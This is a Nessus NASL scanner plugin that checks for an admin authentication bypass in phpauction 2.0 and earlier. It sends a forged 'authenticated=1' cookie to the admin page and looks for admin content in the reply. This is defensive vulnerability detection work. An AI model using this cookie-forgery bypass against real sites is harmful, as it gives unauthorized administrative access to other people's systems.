#
# added by Tobias Glemser (tglemser@tele-consulting.com)
#
# thanks to George A. Theall and Dennis Jackson for helping
# writing this plugin
#
# SEE:http://www.securityfocus.com/bid/12069
#
# This script is released under the GNU GPLv2

if(description)
{
 script_id(19239);
 script_bugtraq_id(12069);
 script_version ("$Revision: 1.2 $");

 name["english"] = "phpauction Admin Authentication Bypass";
 script_name(english:name["english"]);

 desc["english"] = "
The remote host is running phpauction prior or equal to 2.0 (or a modified
version).

There is a flaw when handling cookie-based authentication credentials which 
may allow an attacker to gain unauthorized administrative access to the
auction system.

See also : http://pentest.tele-consulting.com/advisories/04_12_21_phpauction.txt
Solution : Upgrade to a version > 2.0 of this software and/or restrict access 
rights to the administrative directory using .htaccess.
Risk factor : High";
 script_description(english:desc["english"]);
 summary["english"] = "Attempts to bypass phpauction administrative authentication";
 script_summary(english:summary["english"]);
 script_category(ACT_ATTACK);

 script_copyright(english:"(C) 2005 Tobias Glemser (tglemser@tele-consulting.com)");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# The script code starts here
include("http_func.inc");
include("http_keepalive.inc");
include('global_settings.inc');

port = get_http_port(default:80);
# Check if Port 80 is open
if(!get_port_state(port))exit(0);
# Check if PHP is enabled
if(!can_host_php(port:port))exit(0);


if ( thorough_tests ) 
	dirs = make_list( "/phpauction", "/auction", "/auktion", cgi_dirs());
else 
	dirs = cgi_dirs();

foreach dir (dirs)
{
  req = http_get(item:dir +"/admin/admin.php", port:port);
  idx = stridx(req, string("\r\n\r\n"));
  req = insstr(req, '\r\nCookie: authenticated=1;', idx, idx);
  res = http_keepalive_send_recv(port:port, data:req);
  #display("res='", res, "'.\n");
  if( res == NULL ) exit(0);

  if("settings.php" >< res || "durations.php" >< res || ("main.php" >< res && "<title>Administration</title>" >< res))
   {
    security_hole(port);
    exit(0);
   }
}

